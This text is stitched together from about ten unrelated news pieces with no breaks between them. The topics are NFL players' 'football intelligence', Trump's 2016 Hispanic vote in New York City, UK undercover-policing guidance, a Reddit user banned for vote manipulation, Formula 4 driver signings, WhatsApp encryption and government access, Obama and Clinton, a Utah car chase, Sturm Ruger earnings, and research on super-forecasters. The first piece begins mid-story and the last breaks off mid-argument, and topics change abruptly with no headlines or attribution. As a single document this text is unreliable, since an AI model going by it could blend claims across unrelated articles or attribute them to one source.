During the period of more than a year that I spent with the New York Jets coaching staff while writing a book, I came to understand what Fitzpatrick was talking about. Football is a grand spectacle—never more so than in the playoffs, which begin this weekend—and it depends on layers of sophisticated tactics that are not immediately apparent. Winning certainly requires imposing your athletic will on an opponent; that part of the game is easy to see. Yet victories also redound to players who can outthink their adversaries. Because there are so few football games in a season, football players generally don't learn about members of other teams by playing against them, the way baseball and basketball players do. Until they face another team—and, in a given year, they won't see most of those outside their own division—N.F.L. players are unlikely even to be able to name most of its members. Football players must master the opposition conceptually. In addition to the raw speed and strength that professional football requires, the game involves more mental preparation than any other team sport.
In developing a game plan, coaches typically break down everything that happened in the opponent's past four games to granular levels of “tendencies”—down, distance (to a first down), field position, and time remaining on the game clock. Once assembled, this research fills many pages of the game-plan binders players are given on Wednesday to prepare them for Sunday. (Teams have also begun to use iPads.) The binders are dense with intricate drawings and written instructions. They are often as thick as a left tackle's fist.
The crucial portion of the game plan is a selection of new plays and modifications to old ones the coaches have created for the current opponent. N.F.L. coaches are deft and obsessive probers of game film; they live to devise. The problem is that there's a limit to how much fresh information most players can absorb before each Sunday. Marv Levy, who coached the Buffalo Bills to four consecutive Super Bowls in the early nineties, told me he always fell back on something the legendary Notre Dame coaching innovator Knute Rockne once said: “I never ask if a player has the will to win. I ask if he has the will to prepare.”
Levy also wanted to know if players had a brain for football. Since every N.F.L. roster possesses talent sufficient to defeat any given opponent, one of the most coveted qualities in football players is what N.F.L. personnel men call “football intelligence.”
What kind of mind is ideally suited to football? Pat McInally studied history at Harvard, Class of 1975. He was the sort of undergraduate who, out of curiosity, visited the law-school classes of Clark Byse, the professor who was an inspiration for the Charles Kingsfield character in “The Paper Chase.” McInally was also an All-American receiver and punter. He went on to spend ten years as a wide receiver and All-Pro punter for the Cincinnati Bengals. But as far as the N.F.L. was concerned, McInally became a legend when he sat down to take the Wonderlic test and earned a perfect score—the only player ever to do so.
The Wonderlic is a fifty-question examination that tests the ability to answer increasingly difficult questions under time pressure—in this case, a limit of twelve minutes. There might be questions about pattern recognition, numerical sequences, word definition (What is the difference between “flammable” and “inflammable”?), trigonometry, and logic. “I thought it was funny we had to take an intelligence test,” McInally, now a collector of rare books and real estate who coaches at the Brethren Christian High School, in Huntington Beach, said. “I just blew through the thing.”
Among active players, Fitzpatrick is reputed to have the highest recorded Wonderlic score, a forty-nine. Or perhaps it was a forty-eight. Wonderlic scores are not made public, and while Fitzpatrick confirms that he answered forty-nine questions, skipping one that “didn't make sense,” his score is a mystery even to him: “I have been told multiple scores, so I am unsure at this point.” Fitzpatrick has never found much of a relation between his academic talents and his football skills, but, he said, he knew that his ability to solve problems on the clock would distinguish him in the eyes of the N.F.L. draft directors. So he approached the Wonderlic with ferocity, completing it in nine minutes. His performance helped him enter the league—the average score for quarterbacks is in the high twenties. (For wide receivers, the mean is about ten points lower.) During Jets game-plan installation meetings, I saw how it gave the defensive coaches a source of motivation: they called Fitzpatrick “Big Brain,” and told their players they needn't worry, because, under pressure, what would he do—throw a book at them?
More than any other position, playing quarterback requires mastering a farrago of detail, and then sifting through it while staring at eleven large people eager to break your face. The best N.F.L. quarterbacks, like Tom Brady, Drew Brees, and Peyton Manning, have reputations as keen, obsessive students of opposing defenses, whose schemes they decode in real time. And yet, what does it say that the great model of lethally consistent play, Peyton, scored a twenty-eight on the Wonderlic while his more erratic brother, Eli, scored a thirty-nine?
One theory some in the N.F.L. hold is that the highest-scoring quarterbacks are too rigidly scholarly, prisoners of research who don't handle in-game adjustments well, while those whose scores are very low simply can't handle a high volume of preparation.
Oliver Luck was twice an Academic All-American quarterback at West Virginia University, spent five years in the N.F.L., went on to law school, and is now the athletic director at his alma mater. His son, Andrew, (Stanford Class of 2012, architectural design; Wonderlic, thirty-seven) is the Indianapolis Colts' excellent second-year quarterback. “Football intelligence to me is situational awareness,” Oliver Luck told me. “The variables in football are so many. Every play is a decision and you do it at full speed. Life involves more thought.” (If there is a dark undercurrent to a discussion of bright football players, it has to do with life after the scrum and the long-term effects that hits to the head can have on the brain.)
That said, Oliver Luck thinks that there have been certain moments post-football when his aptitude for the game has been helpful to him. “I remember distinctly sitting for the Texas bar exam after I finished law school,” he recalled. “There were maybe five hundred people in there. People were sighing and groaning. A guy one table away from me suddenly lost it. I wanted to tell him, ‘Suck it up! You can do it!' The way I would in the huddle. I was focussed. I knew how to work through that test.”
While the defensive playbooks are much thinner than those for the offense, a defender who is a skilled interpreter of what he sees across the line of scrimmage is extremely valuable. Marty Schottenheimer played linebacker before winning two hundred games as an N.F.L. head coach, and once told me he considered the position the perfect apprenticeship for football leadership.
The Redskins' London Fletcher is undersized and thirty-eight years old, but he's been able to play for so long because he is a defensive Peyton Manning: seeing the game so lucidly, yelling out the offensive play about to unfold, changing alignments before the snap, organizing the field in real time. Similarly, Lavonte David, who has been with the Tampa Bay Buccaneers for two years, is just two hundred and thirty-four pounds—ten to fifteen pounds lighter than most at his position—the Wonderlic scores out on the Internet for him are not especially high, and, like all players, he makes the occasional boneheaded play. But he possesses dedicated study habits and a football clairvoyance that, come Sunday, finds him ignoring the blocking flow only at the one moment during a game when the offense runs the ball away from it.
The Hall of Fame Minnesota Vikings defensive lineman Alan Page weighed two hundred and forty-five pounds, the dimension of a modern fullback. Even so, Page was terrifying. His forty-yard-dash time wasn't anything special, either, but he says that he could run down faster opponents because he always had sense where he was in relation to the blur of bodies around him—he could “understand the situation.” Page is now an Associate Justice on the Minnesota Supreme Court. “Being a football player requires you to take your emotional self to places that most people shouldn't go,” he said. “You wouldn't want to get to know the person who was in my head on a football field. I likely see some of these people in my current job—those who can't control that person—and they do not do very nice things.”
I asked him, “You could control that person on a field?”
“Most of the time,” Page said.
The safety, standing at the rear of the defense, must compensate for the mistakes of others; football intelligence matters more at this position than any other on the defense. At five-eight, a hundred and eighty-eight pounds, the Bills safety Jim Leonhard, a nine-year veteran, is among the smallest and also the slowest starting defensive backs in the game. And yet, watching him on film, he appears to teleport to the ball. Leonhard's name seems to enter any conversation about football intelligence; he knows every teammate's responsibilities in every call, and understands the game as twenty-two intersecting vectors. “He'd walk off the bus and you'd think he was the equipment manager,” Ryan Fitzpatrick said. “He's still in the league because he's the quarterback of the defense.”
From 2009 to 2011, Leonhard, a Wisconsin graduate, was a member of the Jets and, like everyone else around the team, I used to marvel at his study habits. He spent defensive meetings patiently tutoring the other safeties. One day, he showed me a hundred-and-nineteen-page PowerPoint document of his thoughts on the team's defense—lecture notes. I asked Leonhard if, in his time with the Jets, an opposing offense had ever done anything that surprised him. He shook his head no.
Recently, we spoke again about the cerebral aspects of football. “You can see one thing while watching film, and then on the field your perspective shifts,” Leonhard said. “It's the active recall of information on the field.” As he gazes across the line of scrimmage, he looks “for things that don't make sense.”
In football, as in so many parts of life, the true measure of intelligence is elusive. On a Sunday field, if you combine diligent, grinding application with presence and intuition, you can triumph, even if you are slow and have a Wonderlic score of twenty-four, like Jim Leonhard. “If you notice that a team's vertical passes come in certain personnel groups, or in certain field positions, you can change your techniques in those situations to not only be able to cover the wide receivers but to have an opportunity to get interceptions,” he said. I have watched Leonhard make several interceptions; the impression is of a crowd of bison pawing beneath the soaring ball and then a tiny prairie dog suddenly rising from the earth to secure it.
There are “situations that come up in every game: a third down and one in the fourth quarter or a third down in the red zone to force a field goal,” he told me. “Offensive coördinators usually have a couple of calls they feel they can win these situations with. They won't run the play the same as you've seen it [on film], so being able to decipher a shift or a motion or a change in personnel is usually necessary. The smart players can do that consistently.”
Not every smart player will find that his intellect is drawn upon; a good deal depends on his position. The Titans' Pro Bowl cornerback Alterraun Verner completed his mathematics degree at U.C.L.A. with a G.P.A. over 4.0. Football is a game of precise timing and geometry played on a numerical grid, and it might seem that Verner's study of calculus, differential equations, and integrals could be of help to him. But as a cornerback, Verner is alone out on the edge, isolated with the receiver he's covering. The relation between his studies and his sport “is not as big as some want or hope it to be,” he said. “I don't think about angles or quadratics out there. But math people solve problems, and that's the way you approach film study. We look at all the variables.”
Verner would have no trouble learning his team's entire defense, but that would be pointless; feeling so removed from the real complexities of the sport, he said, “I get bored sometimes.”

ANALYSIS/OPINION:
Despite calling for a “big, beautiful” wall at the Southern border (which Mexico will pay for), the deportation of all illegal immigrants, and labeling some Mexicans rapists and drug dealers, businessman Donald Trump won more than half of the GOP Hispanic vote in New York City, according to exit polls.
Mr. Trump won the Soundview, Castle Hill area in the Bronx with 100 percent of the vote, according to the New York Times vote tracker. That area has a relatively diverse population, primarily consisting of blacks and Latin Americans. In the Jackson Heights, Queens, area where many Hispanics reside, Mr. Trump won precincts ranging from 41 percent of the vote, to 87 percent of the vote, with most precincts clocking in above 60 percent for Mr. Trump.
All told, in areas with at least a 50 percent Hispanic population, Mr. Trump won 61 percent of the vote within the city, according to the New York Times vote tracker. It's an unexpected victory to many political pundits and establishment Republicans who were sure, Mr. Trump would repeal the Hispanic vote through his bombastic statements and immigration plan.
Although Mr. Trump won the Hispanic vote in Nevada, the win was largely written off because the numbers were so small. Then, whatever narrative did exist, was overridden by his loses of the Hispanic and Latino vote in both Florida and Texas. Mr. Trump lost both states to Sens. Marco Rubio and Ted Cruz, respectively, both of whom are Cuban-American.
So perhaps it was those states that were the outliers.
But the poll numbers don't look good.
SEE ALSO: Clinton scores dominant win in N.Y.
According to the most recent Gallup poll taken in March, 77 percent of Hispanics view Mr. Trump unfavorably, and as he has become better known to the community, he's become more disliked.
That's not good news, especially when Mr. Trump will be running against Hillary Clinton, who is generally favored in the community. In that same Gallup poll, Republican Hispanics said they most preferred Mr. Rubio as their candidate, then Mr. Cruz, then Ohio Gov. John Kasich, and then both Democrats, before Mr. Trump.
What's interested in the numbers, is if the Gallup poll were accurate, Mr. Trump should've lost the New York City Hispanic vote to either Mr. Cruz or Mr. Kasich, but he didn't — he won their precincts overwhelmingly.
New York is Mr. Trump's home state, and Mr. Cruz's “New York values” comment could've hurt him worse than anyone predicted. But it's still interesting Mr. Trump pulled out a win with this demographic, and it might mean — despite what the polls are saying and most in the political and punditry class — that he's not doomed in the general.

Covert officers can have sex or take drugs with suspects only when ‘necessary and proportionate' under new guidelines
Undercover police officers can never be authorised to start sexual relationships with those they are targeting under official guidelines published for the first time.
The instructions, in an 80-page document, also state that taking drugs cannot be approved as a tactic for covert units.
National guidance on undercover policing, which is being made public by the College of Policing, the professional standards body for the police service, states that it is “never acceptable” for an undercover operative to have sex with those they are investigating.
Launching a consultation on the guidance, Alex Marshall, the chief executive of the College of Policing, told BBC Radio 4's Today programme: “It's never acceptable for an undercover officer to form an intimate sexual relationship with the people they're targeting or they meet while carrying out these duties.”
Marshall said undercover policing should only be used for “people who represent a risk to the public”.
The guidance prohibits officers to “form an intimate sexual relationship with those they are employed to infiltrate and target or may encounter during their deployment”.
It adds: “This conduct will never be authorised, nor must it ever be used as a tactic of a deployment.”
Undercover policing was subject to increased scrutiny following revelations in the Guardian about a secretive Scotland Yard unit known as the Special Demonstrations Squad (SDS).
Undercover officers have been found to have formed long-term intimate relationships with women during their missions, gathered intelligence about the relatives of the murdered teenager Stephen Lawrence and other grieving families campaigning for justice, and concealed evidence in court cases.
Many of the undercover spies secretly stole the identities of dead children to help develop their fake personas, without consulting or informing the children's parents.
Scotland Yard has made payouts to several women who unwittingly became involved in relationships with undercover officers. A judge-led inquiry into undercover policing in England and Wales was launched last year.

The guidance says that if an undercover officer engages in unauthorised sexual activity for whatever reason – for example, they perceive an immediate threat to themselves or others if they do not do so – then this “will be restricted to the minimum conduct necessary to mitigate the threat”.
This would then be recorded, reported and the circumstances investigated. The position set out on sexual activity was described as a “much stronger and unequivocal statement” compared with previous guidelines.
Conduct may be authorised that involves “communications of a sexual nature” where the authorising officer believes it is “necessary and proportionate to operational objectives”, the guidance adds.
Taking controlled drugs “will not be authorised as a tactic of a deployment” but if an officer does so because they perceive an immediate threat this should be limited to the minimum extent necessary to mitigate the threat.
The document also says that for an undercover deployment to be effective it may be necessary for personnel to participate in criminal activity about which they have been tasked to report. It warns all undercover unit staff should be aware of the dangers posed through “exposure in true identity” on social media.
Undercover UK police spy apologises after being tracked down by woman he deceived Read more
Undercover policing is used by forces across England and Wales to obtain evidence and intelligence. “Foundation” operatives carry out low-level infiltration, for example buying drugs on the street. An “advanced” operative is trained to undertake higher-level infiltrations in which they must be able to withstand intense scrutiny, such as counter-terrorism work.
The draft guidance is being published at the start of a consultation, with the final version released later this year.
It says operatives can only work once they have been accredited and should undergo psychological or personality assessments.
Marshall described undercover policing as an “essential tactic” to protect the public, save lives and bring serious criminals to justice.
He said: “By publishing the vast majority of the guidance, withholding only operational tactics which would no longer be viable if shared, we want the public to see the measures we have in place to ensure undercover policing is used in a way that is proportionate, lawful and ethical.”
Lawyer Jules Carey, of Bindmans, who is representing individuals affected by undercover policing, said: “It is disappointing that the guidance fails to spell out that in a democracy the first consideration should be whether it is necessary to use an undercover officer at all, or whether the intelligence could be obtained through some other means.
“The guidance should also make it clear that the degree of intrusion should be proportionate to the seriousness of the crime being investigated.”

Turns out Reddit's favorite scientist wasn't quite as popular as everyone thought he was. Ben Eisenkop, better known as Unidan, was banned by the site last night after the administrators there discovered he was faking votes to make sure his posts got more attention.
Unidan became known as the "excited biologist" for regularly explaining natural phenomena, for being hugely active in the /r/AskScience subreddit, and for generally being a likable, knowledgeable guy. He was also five other guys, apparently—turns out he was using at least five accounts to help destroy his enemies and to artificially pad his own comments and posts.
RELATED: How Reddit Got Huge: Tons of Fake Accounts
Because of Reddit's democratic up vote / down vote system, and because every post has to start somewhere, that's a huge problem. Usually, you can tell within a couple minutes whether a post will get popular or will get buried: Five early, quick upvotes is enough to push public opinion (and the post's visibility) in the right direction. Meanwhile, a couple downvotes soon after something is posted can essentially kill a post before it gets started at all.
"He was caught using a number of alternate accounts to downvote people he was arguing with, upvote his own submissions and comments, and downvote submissions made around the same time he posted his own so that he got even more of an artificial popularity boost," a Reddit administrator, Cupcake1713, wrote on the site. "It was some pretty blatant vote manipulation, which is against our site rules."
Unidan admitted to the fact, and said the manipulation was "mainly used to give my submissions a small boost (I had five 'vote alts') when things were in the new list, or to vote on stuff when I guess I got too hot-headed. It was a really stupid move on my part, and I feel pretty bad about it, especially because it's entirely unnecessary."
He plays it off as not that big of a deal, but, as I said, when something is new, those early votes are hugely important. In essence, Unidan was destroying posts that had a chance of being more popular than his, and was boosting his own—that's a 12 vote swing, which is absolutely integral to getting attention on posts.
"You would be surprised at how effective 5 upvotes of your own stuff and 5 downvotes of someone else's stuff is," Cupcake1713 wrote. "Early voting like that really does affect the perception of other people for better or for worse."
Despite being banned, Unidan has already made a new account, called UnidanX, and has been posting for most of the day under that username. It's looking like he hasn't been banned with that username yet.
As for why you should care about this sort of thing—maybe you shouldn't, but it's a pretty huge development for the site, and speaks to just how important Reddit has become.
Reddit has long since passed the point where it's merely a social networking site—it quite literally has the ability to make or break the commercial viability of news sites. It drives many millions of page views every day, and the traffic bump a top Reddit post gives a site is insane. Gaming the system, like Unidan did, is tempting for a lot of people, and, I'd guess, a lot more common than you'd think.
18 OCTOBER, 2017 – Arden has announced two of its drivers for next year's F4 British Championship certified by FIA – powered by Ford EcoBoost, with Red Bull Junior Team members Jack Doohan and Dennis Hauger to race with the squad.
Having come close to taking the FIA British Formula 4 crown for three consecutive years, Arden has already begun to lay the foundations for its 2018 title bid.
Doohan and Hauger, two of the Red Bull Junior Team's newest recruits, will make the step up from karting and begin their single-seater careers in the F4 British Championship. A series in which Garry Horner's team have an enviable record of success.
Most recently, the Banbury outfit took Oscar Piastri to within touching distance of the crown in the 2017 season finale; on the back of a campaign which saw it record eight pole positions and 30 podiums – more than any other team. The team achieved 11 race wins, as well as a dominant 1-2-3 finish at Knockhill. A feat achieved by no other squad in 2017.
Doohan, son of five-time 500cc world champion and motorcycle legend Mick Doohan, has excelled on four wheels in his rise up the karting ranks.
The 14-year-old recently finished third in the CIK-FIA European Championship after becoming the first Australian in a quarter of a century to win a round in series; taking OK Junior class victory in the final round of the season.
More silverware was added to the Doohan family trophy cabinet in 2015 and 2016, when Jack won the Australian Kart Championship in the KA Junior and KA2 classes respectively.
Said Doohan: “I'm really looking forward to being part of the Arden team as a Red Bull Junior Driver in the 2018 F4 British Championship. To drive for a team as well-respected and successful as Arden in 2018 is something I could have only dreamt of at the start of 2017 when I arrived in Europe to compete in karts. My experience gained in karts from the age of eight has provided me with a solid foundation, but it's now time to take my motorsport career to the next level.”
Hauger is bidding to climb up the FIA single-seater pyramid to become Formula 1's first Norwegian driver. He wasted no time making his mark in the world of karting, which began with his first win aged just eight-years-old.
The talented teenager became the youngest driver to compete in the CIK-FIA European Championship's Senior OK category in 2017; following a record-breaking 2016 campaign in which he was crowned the youngest ever DKM OKJ German Champion and finished second in the WSK Super Masters.
Commented Hauger: “I really appreciate the opportunity that I have been given with Red Bull and Arden. This is the perfect combination that will give me the best setting to learn and grow as a driver, and to hopefully win races in my first season in single-seaters.
“I have followed Arden in British F4 and they are a very professional and strong team. I also had the pleasure of visiting the team to do some simulator driving. I was made to feel very welcome and they took excellent care of me in a very professional manner during those days. I'm really looking forward to the challenge and opportunity that is coming up.”
Said Arden team manager Ben Bloomfield: “It's great to be part of the Red Bull Junior programme again, but also a privilege to be fielding two of the brightest and best from European Karting. Both Hauger and Doohan have been impressive in the CIK-FIA European Championship and CIK-FIA European Junior Championship respectively so they will push each other hard next year.”
WhatsApp claims it cannot read its user's messages, let alone the Government
The UK Government demanded that WhatsApp comes up with a way to offer access to encrypted messages this summer, Sky News has learned - a request that was rejected by the instant messaging service.
The inability to access terrorists' encrypted conversations is creating a "black hole" for security services, according to a security source.
Terrorists are "frequent users of encrypted apps" - specifically WhatsApp and Telegram, the source said.
"It is crucially important that we can access their communications - and when we can't, it can provide a black hole for investigators," the source added.
At a United Nations discussion on Wednesday, the Prime Minister Theresa May will ask technology companies to do more to help governments fight terrorism in the wake of the explosion at Parsons Green Tube station.
Encrypted messaging apps were used ahead of the attacks on Westminster, Manchester and London Bridge.
The devices of one of the Parsons Green suspects have been recovered and are being investigated by intelligence agencies.
What the tech companies say about encryption
Apps such as WhatsApp, Telegram and Apple iMessage employ end-to-end encryption. Messages sent by users are scrambled by a code contained on the app on their phone, or the phone itself.
The systems are designed so that tech companies themselves do not have access to the content of a message.
Sky News understands that WhatsApp co-operates with law enforcement to provide the metadata it does hold - the name of an account, when it was created, the last seen date, the IP address and associated email address.
WhatsApp says it "appreciates the work that law enforcement agencies do to keep people safe around the world. We are prepared to carefully review, validate and respond to law enforcement requests based on applicable law and policy".
But the company argues that it can't provide data that WhatsApp itself does not collect in the first place, including the contents of a message.
In a statement on its website, the company writes: "Naturally, people have asked what end-to-end encryption means for the work of law enforcement. WhatsApp appreciates the work that law enforcement agencies do to keep people safe around the world.
"We carefully review, validate, and respond to law enforcement requests based on applicable law and policy, and we prioritise responses to emergency requests."
Raffaello Pantucci, director of security at the Royal United Services Institute, told Sky News: "The way you have to think that the terrorist groups use these sorts of applications is the same way that all of us use encrypted applications, which is to plan our lives.
"So what you're increasingly seeing is that individuals are forming relationships or advancing relationships using these online communication methods.
"And they're using this to direct plots. We've had some instances where you've had individuals based in Raqqa who are steering people to launch terrorist attacks from a distance and are communicating with them blow by blow using these encrypted communications.'"
Image: The Westminster attacker used WhatsApp moments before the atrocity began
Sky News understands that 80% of investigations into terrorism and serious crime are now impacted by encryption.
Terrorists themselves are now "far more cyber savvy" than they have been before, the security source told Sky News.
At a meeting this summer, British officials asked WhatsApp to come up with technical solutions to allow them to access the content of messages - effectively, a back door.
Cybersecurity experts say that creating a back door for a government would weaken encryption for everyone, as it would be a prime target for hackers.
But UK intelligence officials believe a compromise could be possible - pointing out that cybersecurity isn't binary and that services offer different levels of cybersecurity to deal with different levels of threats.
The UK Government remains firm in its aspiration to obtain the unencrypted content of messages under a proper warrant.
The problem of obtaining access to the content of communications is larger than any one company.
March: Rudd calls for access to WhatsApp data
Telegram remains popular for dissemination of jihadist materials. Sky News observed channels - including al Qaeda's official mouthpiece and Abu Qatada, the radical cleric deported to Jordan - pumping out propaganda.
Recruiters pump out content to lure the curious. That can inspire attacks - or they can go one further and use the same app to direct attacks a continent away.
Telegram told Sky News it has a dedicated channel to remove terrorist accounts, explaining: "As a result, jihadi channels usually go down within a few hours, long before they can reach any traction."
Earlier this year, Facebook, YouTube, Twitter and Microsoft - along with other tech companies - announced they would form the Global Internet Forum to Counterterrorism in an attempt to tackle extremism on their platforms.

Obama called Clinton on Tuesday night to congratulate her on wrapping up the nomination.
“Her historic campaign inspired millions and is an extension of her lifelong fight for middle-class families and children,” the White House said in a statement.
The president also spoke with Sanders, thanking him for “energizing millions of Americans with his commitment to issues like fighting economic inequality and special interests' influence on our politics,” according to press secretary Josh Earnest.
Sanders and Obama will meet in person Thursday, according to the press release, to “continue their conversation about the significant issues at stake in this election that matter most to America's working families.”
“The President looks forward to continuing the conversation with Senator Sanders about how to build on the extraordinary work he has done to engage millions of Democratic voters, and to build on that enthusiasm in the weeks and months ahead,” the White House said in a statement.
Obama is believed to be close to officially endorsing Clinton for president.
Clinton on Tuesday night became the presumptive Democratic presidential nominee, holding both a majority of pledged delegates and superdelegates — the party leaders, such as Obama, who can support whomever they choose.
Clinton claimed victory at a campaign rally in Brooklyn on Tuesday night, where she extended an olive branch to Sanders supporters.
Sanders will address his supporters at a rally in Santa Monica, Calif., at 1 a.m. EST.
He has given no sign that he intends to get out of the race and insists that he'll seek to flip superdelegates into his column between now and the Democratic National Convention in Philadelphia in July.

SYRACUSE, Utah -- Police were involved in a pursuit of a car Saturday, and dramatic video from a FOX 13 News viewer shows the car speeding across the grass of Founders Park as children frantically move out of the way.
The chase ended around 6:12 p.m. at 1500 S. Banbury Drive in Syracuse, and police officials said a minor had taken the vehicle without permission and officers sought the vehicle on a breach of trust.
The 14-year-old male driving the car is from Sunset and had taken the vehicle from his grandfather in Duchesne County, and the grandfather reported the car stolen, according to a press release from the Syracuse Police Department. Police put out an attempt to locate, and police responded after a tipster spotted the car in Syracuse. The tipster heard the attempt to locate while using a police scanner app on a smart phone.
Syracuse Police Department officials responded to the call, and video footage of the chase is available above. A photo from the scene shows the same car that tore through the park collided with a pickup truck. A second photo shows the damage to both vehicles, see the gallery below. Another video, courtesy of Bryson and Brandy Rowley, shows the moment of impact:

Bryson Rowley was driving the truck, and he said he intentionally used his truck as a ram rod to stop the fleeing vehicle. Rowley provided the pictures and videos in this story, and he said he acted to end the chase because he was afraid for the safety of his and other children at the park.
“The person driving the truck could see it was turning back into the park, and he did not want the car to hit all of the children, or any of the children, and he actually pulled his truck in the way so the car collided with the truck,” said Officer Erin Behm with the Syracuse Police Department.
Brandy Rowley, Bryson's wife, spoke about the incident.
“My heart dropped," she said. "I honestly thought one of those kids is going to die."
In the days that followed the incident, many people hailed Rowley as a hero and several people offered to repair his truck for free. He spoke with FOX 13 News about the support he's received and about his decision to intervene in the chase, click here for that interview.
Officials said the teen was taken to a nearby juvenile detention center.
Sturm Ruger reported some of the highest earnings in company history and predicted demand for guns could keep growing because of the heated election
Sturm, Ruger & Co, one of the largest gun manufacturers in the US, reported sales of $173.1m for the first quarter of 2016, up 26% from last year and some of the highest earnings in the company's 67-year history.
At a shareholding meeting, executives said “we are good citizens” and predicted that demand for guns could continue to grow thanks to the increasingly heated political rhetoric of the 2016 election, and a long-term trend of Americans wanting guns for self-defense.
At $1.21 a share, earnings per share increased 49% from the first quarter of 2015. Sturm Ruger's first-quarter results included the second-highest revenue and third-highest earnings since it was founded in 1949.
Sturm Ruger reported that firearm orders by gun shops increased in the past year, and listed sales to 18 federally licensed firearm wholesalers. In the first quarter, the unit sell-through of Sturm Ruger's products by its distributors to retailers increased 17% compared to 2015, and distributors' inventories decreased by 54,300 units overall.

More than 99% of the company's net sales came from firearms. Just $1.5m came from sales of casting.
During its annual meeting with shareholders, Sturm Ruger's CEO, Michael Fifer, described the company as an American manufacturer and “good citizen”.
“We make products in American factories. We pour metal. We cut wood. We assemble guns,” he said, noting that the company's three gun factories in New Hampshire, Arizona and North Carolina employ more than 2,000 people. “We are basically an industrial manufacturer of great consumer products. We take pride in being an American manufacturer.”
“We pay our taxes and we keep our cash in the United States. There are no tax inversions or offshoring for us. We are good citizens,” he continued. “We understand that manufacturing – the conversion of raw materials into something useful – is a core foundation of any successful economy, including ours.”
His comments coincide with increased pressure on the gun industry by the Democratic frontrunner for president, Hillary Clinton. Clinton has promised that if elected president she would attempt to close the loopholes that make gun manufacturers and gun sellers exempt from certain lawsuits related to gun deaths.
A decade of growth
Despite an increased demand for gun control, gun sales and gun production in the US have surged over the past decade.

“Our industry appears to have been growing overall during the past 10 years as the number of new shooters has steadily increased, as the demographics of new shooters have broadened and many states have embraced more favorable gun-rights laws,” Fifer said. “Particularly, concealed-carry laws.”
In the presentation to shareholders, Sturm Ruger officials noted that the average age of gun-owning Americans has decreased in recent years.
While the average gun owner may be getting younger, many are no longer coming from gun-owning families and so are discovering guns on their own at a later age than before. “We see a lot more women shooters. We see more folks from urban and suburban areas, and we see fewer folks who hunted prior to their first purchase,” explained Chris Killoy, president of Sturm Ruger. “A lot of folks are getting started older. They weren't necessarily started in a shooting family or a hunting family. They got started a little later.”
Although the demand for guns has increased, the number of US households with guns has declined. In 2010 and 2014, about 31% of US households reported having a firearm, the lowest level of gun ownership in about 40 years. Yet from 2010 to 2013, the number of guns manufactured in the US has almost doubled going from 5.5m to 10.9m, according to the Department of Justice.

As Fifer pointed out, fear about gun rights can drive up demand, as gun owners stock up on firearms. According to the Washington Post, in 2013 there were on average eight guns in a gun-owning household; that's up from four in 1994.
Sales boost due to political rhetoric
Fifer added that the American gun industry has experienced dramatic rises and falls, volatility that he attributed to political rhetoric and the press. Periods of demand are often followed by periods when buyers “retreated as threats to gun rights failed to materialize”.
Back in February, Fifer predicted that the demand for guns would go up if Democrats won the Senate and if a Democrat were elected the next president.
The most recent spike in demand was attributed to an increased desire for self-defense. Fifer explained that terrorist attacks are a boon to the industry, saying: “2015 was a recovery year in the cycle, until very late in the year when we observed very significant demand. The spike in demand was strongly correlated to the tragic terrorist activities in Paris and San Bernardino.”
“Demand for firearms for self-defense and concealed carry increased dramatically,” he added, “and that demand continued to the first quarter of 2016.”
Smith & Wesson profits double in period surrounding San Bernardino shooting Read more
Last year saw a record 23m background checks for gun purchases. Additionally, background checks for the first three months of 2016 have gone up 36% compared to last year. More than 7.6m background checks for gun purchases have been performed in January, February and March. Background checks are not the most accurate metric for determining sales, as not every background check results in purchase and multiple guns can be purchased with one background check.
The demand, however, might be “retreating” once again.
“In the past couple of weeks, there have been some early anecdotal hints that the spike in demand might be easing and that the normal seasonal pattern of demand might be taking hold,” Fifer said.
“It is, however, an election year, and the rhetoric from both sides is likely to continue keeping consumers aware and thinking about their firearms rights.”
According to Fifer's presentations to the shareholders, Sturm Ruger has the broadest product line in the industry, featuring “firearms that the average person can afford”.
Cast your mind back across the turbulent events of recent history. Did you foresee President Obama's election before he was even elected as a Democratic candidate – or did you back Hillary Clinton? How about the Arab Spring – could you hear the revolution in the first tremors of dissatisfaction? And did you faithfully predict the recent Ukraine crisis?
If you answer yes to these questions, you could be a “super-forecaster”, someone who is able to foresee the outcome of world events with astonishing accuracy. This has nothing to do with the reading of tea leaves; nor do you have to be a seasoned political pundit. Some super-forecasters are just everyday people, from all walks of life, who happen to have astonishingly perceptive judgements.
Over the last few years, psychologists have found a series of “hidden” talents for extraordinary mental skills that can go unnoticed by the people harbouring them. There are “super-recognisers”, for instance, who can easily remember people's faces, even if they had only met the person once, years before. Other gifted individuals include super-tasters, who have an intense perception of flavour and super memorisers who naturally recall events from almost every day of their lives.
Those talents might be largely down to our genes, whereas forecasting ability should, in theory, be down to experience and learned skill. Yet top political experts tend to perform very poorly at crystal ball gazing: Philip Tetlock at the University of Pennsylvania has found they do only slightly better than chance. “Chimps randomly throwing darts at the possible outcomes would have done almost as well as the experts,” is how one political scientist summarised the findings to the New York Times.
Needless to say, military intelligence agencies have been watching closely. Inspired, in part, by one of Tetlock's reports, the US Intelligence Advanced Research Projects Activity (IARPA) sponsored the four-year-long “Good Judgement Project” that aimed to find new approaches to political forecasting. Taking the form of a tournament, it recruited thousands of participants from all walks of life to test their forecasting skills on a range of questions, such as “Will Robert Mugabe cease to be President of Zimbabwe by 30 September 2011?” or “Will Greece remain a member of the EU through 1 June 2012?” Rather than simple yes or no answers – which cannot reflect the inherent uncertainty of life – they were asked to estimate the probability that each event would occur.
Three years into the tournament, Tetlock's team has now released some of its first results to the journal Psychological Science, and at the annual meeting of the Association for Psychological Science in San Francisco last month.
One of the main aims was to see whether certain forecasters were consistently good. So after one year Tetlock checked the results of more than 2,000 participants and siphoned off the top 2% – the so-called “super forecasters”, who then formed teams for the rest of the tournament. At the end of the second year, their performance was up to four times more accurate than other participants.
Hidden talents
Although political expertise may have helped, they came from a variety of professions. “One of the best forecasters was a pharmacist,” says Tetlock.
As you might expect, these elite forecasters tended to score better on measures of intelligence than the other participants. But they all shared one other trait too: open-mindedness. In everyday life, open-mindedness may be mistaken for having liberal political views, but in psychology it is thought to reflect how well you deal with uncertainty. Crucially, open-minded people tend to be able to see problems from all sides, which seems to help forecasters overcome their preconceptions in the light of new evidence. “You need to change your mind fast, and often,” says Tetlock.
Another trait of effective forecasting that Tetlock highlights is self-awareness – understanding your own foibles. Even expert forecasters may fall into certain traps, so Tetlock's team decided to test whether an hours' simple training could help his forecasters avoid the most common mistakes. He is reluctant to give too many details of the methods, in case it influences his forecasters' future performance, but he points out that too often forecasters begin by taking an “inside view” of a problem; when considering whether Mugabe would remain in power, for instance, they might begin by looking for measures of unrest in the country.
